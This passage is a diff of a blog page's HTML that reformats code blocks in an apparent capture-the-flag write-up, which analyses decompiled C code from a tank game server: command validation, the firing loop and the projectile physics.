-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">    <span style="color:#ff79c6">if</span> ( <span style="color:#ff79c6">!</span>RecvClientCommand(c, <span style="color:#ff79c6">&amp;</span>command_received_by_client) )
-        <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">2LL</span>;
-    <span style="color:#ff79c6">if</span> ( cplusplus_string_compare(<span style="color:#ff79c6">&amp;</span>command_received_by_client, <span style="color:#f1fa8c">&#34;FIRE&#34;</span>) )
-        <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">3LL</span>;
-    <span style="color:#ff79c6">if</span> ( tanks[<span style="color:#bd93f9">0</span>].hp <span style="color:#ff79c6">&lt;=</span> <span style="color:#bd93f9">0</span> )
-    {
-        SendText(c, <span style="color:#f1fa8c">&#34;Bye.&#34;</span>);
-        <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">0LL</span>;
-    }
-
-    t <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">*</span>array_access_operator(command_received_by_client.data, <span style="color:#bd93f9">0LL</span>);
-    <span style="color:#ff79c6">if</span> ( t.Weapon <span style="color:#ff79c6">!=</span> <span style="color:#bd93f9">1</span> <span style="color:#ff79c6">&amp;&amp;</span> t.Weapon <span style="color:#ff79c6">!=</span> <span style="color:#bd93f9">2</span> <span style="color:#ff79c6">&amp;&amp;</span> t.Weapon <span style="color:#ff79c6">!=</span> <span style="color:#bd93f9">3</span> )
-        <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">4LL</span>;
-    <span style="color:#ff79c6">if</span> ( t.Power <span style="color:#ff79c6">&lt;</span> <span style="color:#bd93f9">10.0</span> <span style="color:#ff79c6">||</span> t.Power <span style="color:#ff79c6">&gt;</span> <span style="color:#bd93f9">100.0</span> )
-        <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">5LL</span>;
-</code></pre></td></tr></table>
-</div>
-</div><p>Here it receives a packet from the client and checks if it&rsquo;s a <strong>FIRE</strong> command, because this
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28</span>    <span style="color:#ff79c6">if</span> ( <span style="color:#ff79c6">!</span>RecvClientCommand(c, <span style="color:#ff79c6">&amp;</span>command_received_by_client) )
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29</span>        <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">2LL</span>;
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30</span>    <span style="color:#ff79c6">if</span> ( cplusplus_string_compare(<span style="color:#ff79c6">&amp;</span>command_received_by_client, <span style="color:#f1fa8c">&#34;FIRE&#34;</span>) )
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31</span>        <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">3LL</span>;
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32</span>    <span style="color:#ff79c6">if</span> ( tanks[<span style="color:#bd93f9">0</span>].hp <span style="color:#ff79c6">&lt;=</span> <span style="color:#bd93f9">0</span> )
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33</span>    {
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34</span>        SendText(c, <span style="color:#f1fa8c">&#34;Bye.&#34;</span>);
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35</span>        <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">0LL</span>;
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36</span>    }
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38</span>    t <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">*</span>array_access_operator(command_received_by_client.data, <span style="color:#bd93f9">0LL</span>);
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39</span>    <span style="color:#ff79c6">if</span> ( t.Weapon <span style="color:#ff79c6">!=</span> <span style="color:#bd93f9">1</span> <span style="color:#ff79c6">&amp;&amp;</span> t.Weapon <span style="color:#ff79c6">!=</span> <span style="color:#bd93f9">2</span> <span style="color:#ff79c6">&amp;&amp;</span> t.Weapon <span style="color:#ff79c6">!=</span> <span style="color:#bd93f9">3</span> )
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40</span>        <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">4LL</span>;
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41</span>    <span style="color:#ff79c6">if</span> ( t.Power <span style="color:#ff79c6">&lt;</span> <span style="color:#bd93f9">10.0</span> <span style="color:#ff79c6">||</span> t.Power <span style="color:#ff79c6">&gt;</span> <span style="color:#bd93f9">100.0</span> )
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42</span>        <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">5LL</span>;
+</code></pre></div><p>Here it receives a packet from the client and checks if it&rsquo;s a <strong>FIRE</strong> command, because this
 is the only input that we can send to the server as client. Whenever a client fires a bullet
 it sends a <strong>FIRE</strong> Packet and a <strong>Bullet</strong> Packet. Then it checks if <strong>Weapon</strong> is a valid
 <strong>Weapon</strong> value and if the <strong>Power</strong> and <strong>Angle</strong> are also valid or not.</p>
 <p>Now we will look at the Game loop</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
-</span><span style="display:block;width:100%;background-color:#3d3f4a"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45
-</span></span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46
-</span><span style="display:block;width:100%;background-color:#3d3f4a"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47
-</span></span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">48
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">49
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">50
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">51
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">52
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">53
-</span><span style="display:block;width:100%;background-color:#3d3f4a"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">54
-</span></span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">55
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">56
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">57
-</span><span style="display:block;width:100%;background-color:#3d3f4a"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">58
-</span></span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">59
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">60
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">61
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">62
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">63
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">64
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">65
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">66
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">67
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">68
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#ff79c6">if</span> ( t.Angle <span style="color:#ff79c6">&gt;=</span> <span style="color:#bd93f9">0.0</span> <span style="color:#ff79c6">&amp;&amp;</span> t.Angle <span style="color:#ff79c6">&lt;=</span> <span style="color:#bd93f9">180.0</span> )
-{
-<span style="display:block;width:100%;background-color:#3d3f4a">    <span style="color:#ff79c6">for</span> ( i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; ; <span style="color:#ff79c6">++</span>i ) <span style="color:#6272a4">// Game loop
-</span></span><span style="color:#6272a4"></span>    {
-<span style="display:block;width:100%;background-color:#3d3f4a">        <span style="color:#ff79c6">if</span> ( i <span style="color:#ff79c6">&gt;</span> <span style="color:#bd93f9">1</span> )
-</span>            <span style="color:#ff79c6">goto</span> LABEL_4;
-        
-        <span style="color:#6272a4">/* ... */</span>
-
-        <span style="color:#ff79c6">if</span> ( i <span style="color:#ff79c6">||</span> tanks[<span style="color:#bd93f9">0</span>].hp <span style="color:#ff79c6">&lt;=</span> <span style="color:#bd93f9">0</span> )
-        {
-<span style="display:block;width:100%;background-color:#3d3f4a">            <span style="color:#ff79c6">if</span> ( i <span style="color:#ff79c6">!=</span> <span style="color:#bd93f9">1</span> <span style="color:#ff79c6">||</span> tanks[<span style="color:#bd93f9">1</span>].hp <span style="color:#ff79c6">&lt;=</span> <span style="color:#bd93f9">0</span> )
-</span>                <span style="color:#ff79c6">continue</span>;
-            expl <span style="color:#ff79c6">=</span> FireTankGunAndCheatHard(map, <span style="color:#ff79c6">&amp;</span>bullet_event, <span style="color:#ff79c6">&amp;</span>dword_0 <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">1</span>, v7, v8, v9);
-        }
-<span style="display:block;width:100%;background-color:#3d3f4a">        <span style="color:#ff79c6">else</span>
-</span>        {
-            <span style="color:#ff79c6">*&amp;</span>expl.exploded <span style="color:#ff79c6">=</span> FireTankGun(map, <span style="color:#ff79c6">&amp;</span>bullet_event, <span style="color:#ff79c6">&amp;</span>t, v7, v8);
-            <span style="color:#ff79c6">*&amp;</span>expl.y <span style="color:#ff79c6">=</span> v10;
-        }
-        <span style="color:#ff79c6">if</span> ( SendBullet(c, <span style="color:#ff79c6">&amp;</span>bullet_event) <span style="color:#ff79c6">!=</span> <span style="color:#bd93f9">1</span> )
-            <span style="color:#ff79c6">goto</span> LABEL_4;
-
-        <span style="color:#6272a4">/* Explosion related code redacted */</span>
-    }
-}
-</code></pre></td></tr></table>
-</div>
-</div><p>In the above loop it is doing the calculation related to Firing of bullet.
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43</span><span style="color:#ff79c6">if</span> ( t.Angle <span style="color:#ff79c6">&gt;=</span> <span style="color:#bd93f9">0.0</span> <span style="color:#ff79c6">&amp;&amp;</span> t.Angle <span style="color:#ff79c6">&lt;=</span> <span style="color:#bd93f9">180.0</span> )
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44</span>{
+<span style="display:block;width:100%;background-color:#3d3f4a"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45</span>    <span style="color:#ff79c6">for</span> ( i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; ; <span style="color:#ff79c6">++</span>i ) <span style="color:#6272a4">// Game loop
+</span></span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46</span><span style="color:#6272a4"></span>    {
+<span style="display:block;width:100%;background-color:#3d3f4a"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47</span>        <span style="color:#ff79c6">if</span> ( i <span style="color:#ff79c6">&gt;</span> <span style="color:#bd93f9">1</span> )
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">48</span>            <span style="color:#ff79c6">goto</span> LABEL_4;
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">49</span>        
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">50</span>        <span style="color:#6272a4">/* ... */</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">51</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">52</span>        <span style="color:#ff79c6">if</span> ( i <span style="color:#ff79c6">||</span> tanks[<span style="color:#bd93f9">0</span>].hp <span style="color:#ff79c6">&lt;=</span> <span style="color:#bd93f9">0</span> )
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">53</span>        {
+<span style="display:block;width:100%;background-color:#3d3f4a"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">54</span>            <span style="color:#ff79c6">if</span> ( i <span style="color:#ff79c6">!=</span> <span style="color:#bd93f9">1</span> <span style="color:#ff79c6">||</span> tanks[<span style="color:#bd93f9">1</span>].hp <span style="color:#ff79c6">&lt;=</span> <span style="color:#bd93f9">0</span> )
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">55</span>                <span style="color:#ff79c6">continue</span>;
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">56</span>            expl <span style="color:#ff79c6">=</span> FireTankGunAndCheatHard(map, <span style="color:#ff79c6">&amp;</span>bullet_event, <span style="color:#ff79c6">&amp;</span>dword_0 <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">1</span>, v7, v8, v9);
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">57</span>        }
+<span style="display:block;width:100%;background-color:#3d3f4a"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">58</span>        <span style="color:#ff79c6">else</span>
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">59</span>        {
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">60</span>            <span style="color:#ff79c6">*&amp;</span>expl.exploded <span style="color:#ff79c6">=</span> FireTankGun(map, <span style="color:#ff79c6">&amp;</span>bullet_event, <span style="color:#ff79c6">&amp;</span>t, v7, v8);
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">61</span>            <span style="color:#ff79c6">*&amp;</span>expl.y <span style="color:#ff79c6">=</span> v10;
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">62</span>        }
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">63</span>        <span style="color:#ff79c6">if</span> ( SendBullet(c, <span style="color:#ff79c6">&amp;</span>bullet_event) <span style="color:#ff79c6">!=</span> <span style="color:#bd93f9">1</span> )
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">64</span>            <span style="color:#ff79c6">goto</span> LABEL_4;
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">65</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">66</span>        <span style="color:#6272a4">/* Explosion related code redacted */</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">67</span>    }
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">68</span>}
+</code></pre></div><p>In the above loop it is doing the calculation related to Firing of bullet.
 Here IDA&rsquo;s decompiled code made it a bit hard to realise whats happening.
 The highlighted <strong>for-loop</strong> on line <strong>45-47</strong> iterates from <strong>0-1</strong> and
 that is because it is iterating over the two tanks for shooting, if <strong>i</strong>
@@ -499,292 +366,143 @@ is 1 then <strong>FireTankGunAndCheatHard</strong> function is called because <s
 is the enemy tank but if <strong>i</strong> is 0, then <strong>FireTankGun</strong> function is called.</p>
 <p>Let&rsquo;s see both of these functions, I am using the challenge source code here</p>
 <h1 id="1-firetankgun">1. FireTankGun</h1>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="display:block;width:100%;background-color:#3d3f4a"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span></span><span style="display:block;width:100%;background-color:#3d3f4a"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span></span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
-</span><span style="display:block;width:100%;background-color:#3d3f4a"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
-</span></span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
-</span><span style="display:block;width:100%;background-color:#3d3f4a"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
-</span></span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">Explosion <span style="color:#ff79c6">__fastcall</span> <span style="color:#50fa7b">FireTankGun</span>(
-	<span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>map,
-	Bullet <span style="color:#ff79c6">*</span>bullet,
-	TargettingData <span style="color:#ff79c6">*</span>Target,
-	<span style="color:#8be9fd">int</span> x, <span style="color:#8be9fd">int</span> y
-)
-{
-
-	<span style="color:#6272a4">/* ... */</span>
-
-<span style="display:block;width:100%;background-color:#3d3f4a">	vx <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0.01</span> <span style="color:#ff79c6">*</span> Target<span style="color:#ff79c6">-&gt;</span>Power <span style="color:#ff79c6">*</span> cos(<span style="color:#bd93f9">3.14159</span> <span style="color:#ff79c6">*</span> Target<span style="color:#ff79c6">-&gt;</span>Angle <span style="color:#ff79c6">/</span> <span style="color:#bd93f9">180.0</span>);
-</span><span style="display:block;width:100%;background-color:#3d3f4a">	vy <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0.01</span> <span style="color:#ff79c6">*</span> Target<span style="color:#ff79c6">-&gt;</span>Power <span style="color:#ff79c6">*</span> <span style="color:#ff79c6">-</span>sin(<span style="color:#bd93f9">3.14159</span> <span style="color:#ff79c6">*</span> Target<span style="color:#ff79c6">-&gt;</span>Angle <span style="color:#ff79c6">/</span> <span style="color:#bd93f9">180.0</span>);
-</span>	bullet_event_clear(bullet);
-	x_1 <span style="color:#ff79c6">=</span> v6;
-	y_1 <span style="color:#ff79c6">=</span> v7 <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">5.0</span>;
-	explode <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
-	last_ix <span style="color:#ff79c6">=</span> min();
-	last_iy <span style="color:#ff79c6">=</span> min();
-	<span style="color:#ff79c6">for</span> ( i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; i <span style="color:#ff79c6">&lt;=</span> <span style="color:#bd93f9">9999</span>; <span style="color:#ff79c6">++</span>i )
-	{
-		x_1 <span style="color:#ff79c6">=</span> x_1 <span style="color:#ff79c6">+</span> vx;
-		y_1 <span style="color:#ff79c6">=</span> y_1 <span style="color:#ff79c6">+</span> vy;
-<span style="display:block;width:100%;background-color:#3d3f4a">		vy <span style="color:#ff79c6">=</span> vy <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0.0009807000000000001</span>;
-</span>		ix <span style="color:#ff79c6">=</span> x_1;
-		iy <span style="color:#ff79c6">=</span> y_1;
-		<span style="color:#6272a4">/* ... */</span>
-	}
-	<span style="color:#ff79c6">if</span> ( explode )
-	{
-		a2.x <span style="color:#ff79c6">=</span> ix;
-		a2.y <span style="color:#ff79c6">=</span> iy;
-		a2.weapon <span style="color:#ff79c6">=</span> Target<span style="color:#ff79c6">-&gt;</span>Weapon;
-		bullet_event_emplace_back(bullet, <span style="color:#ff79c6">&amp;</span>a2);
-<span style="display:block;width:100%;background-color:#3d3f4a">		ApplyExplosionToMap(map, ix, iy, Target<span style="color:#ff79c6">-&gt;</span>Weapon);
-</span>	}
-	LOBYTE(v5) <span style="color:#ff79c6">=</span> explode;
-	<span style="color:#ff79c6">return</span> v5 <span style="color:#ff79c6">|</span> (ix <span style="color:#ff79c6">&lt;&lt;</span> <span style="color:#bd93f9">32</span>);
-}
-</code></pre></td></tr></table>
-</div>
-</div><p>This function is responsible for projectile shooting of <strong>Green Tank</strong>. The trajectory of bullet is effected by <strong>Gravity</strong> (line 23), <strong>Angle</strong> and <strong>Power</strong> (line 11-12). After calculating the correct coordinate of the Explosion, the explosion effect is applied to the <strong>MAP</strong> (line 34).</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span>Explosion <span style="color:#ff79c6">__fastcall</span> <span style="color:#50fa7b">FireTankGun</span>(
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span>	<span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>map,
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span>	Bullet <span style="color:#ff79c6">*</span>bullet,
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span>	TargettingData <span style="color:#ff79c6">*</span>Target,
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span>	<span style="color:#8be9fd">int</span> x, <span style="color:#8be9fd">int</span> y
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span>)
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span>{
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span>	<span style="color:#6272a4">/* ... */</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span>
+<span style="display:block;width:100%;background-color:#3d3f4a"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span>	vx <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0.01</span> <span style="color:#ff79c6">*</span> Target<span style="color:#ff79c6">-&gt;</span>Power <span style="color:#ff79c6">*</span> cos(<span style="color:#bd93f9">3.14159</span> <span style="color:#ff79c6">*</span> Target<span style="color:#ff79c6">-&gt;</span>Angle <span style="color:#ff79c6">/</span> <span style="color:#bd93f9">180.0</span>);
+</span><span style="display:block;width:100%;background-color:#3d3f4a"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span>	vy <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0.01</span> <span style="color:#ff79c6">*</span> Target<span style="color:#ff79c6">-&gt;</span>Power <span style="color:#ff79c6">*</span> <span style="color:#ff79c6">-</span>sin(<span style="color:#bd93f9">3.14159</span> <span style="color:#ff79c6">*</span> Target<span style="color:#ff79c6">-&gt;</span>Angle <span style="color:#ff79c6">/</span> <span style="color:#bd93f9">180.0</span>);
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span>	bullet_event_clear(bullet);
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span>	x_1 <span style="color:#ff79c6">=</span> v6;
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span>	y_1 <span style="color:#ff79c6">=</span> v7 <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">5.0</span>;
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16</span>	explode <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17</span>	last_ix <span style="color:#ff79c6">=</span> min();
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18</span>	last_iy <span style="color:#ff79c6">=</span> min();
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19</span>	<span style="color:#ff79c6">for</span> ( i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; i <span style="color:#ff79c6">&lt;=</span> <span style="color:#bd93f9">9999</span>; <span style="color:#ff79c6">++</span>i )
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20</span>	{
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21</span>		x_1 <span style="color:#ff79c6">=</span> x_1 <span style="color:#ff79c6">+</span> vx;
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22</span>		y_1 <span style="color:#ff79c6">=</span> y_1 <span style="color:#ff79c6">+</span> vy;
+<span style="display:block;width:100%;background-color:#3d3f4a"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23</span>		vy <span style="color:#ff79c6">=</span> vy <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0.0009807000000000001</span>;
